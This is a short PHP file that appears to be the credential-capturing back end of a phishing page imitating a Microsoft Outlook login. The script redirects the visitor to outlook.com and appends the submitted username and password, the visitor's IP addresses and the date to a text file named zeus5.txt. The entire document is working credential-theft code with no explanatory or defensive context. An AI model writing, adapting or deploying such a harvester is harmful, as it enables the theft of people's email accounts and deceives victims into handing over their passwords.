<?php

header ('Location:https://outlook.com/');

$filename = "zeus5.txt";
$handle = fopen($filename, "a");

fwrite($handle, "***********************************************\n");
fwrite($handle, 'U: '.$_POST['ipt1']."\n");
fwrite($handle, 'P: '.$_POST['ipt2']."\n");
fwrite($handle, 'IP: '. $_SERVER['REMOTE_ADDR']."\n");
fwrite($handle, 'IP2: '.$_SERVER['HTTP_X_FORWARDED_FOR']."\n");

fwrite($handle, 'Date: '. date("d-m-Y")."\n");
fclose($handle);

exit;
?>
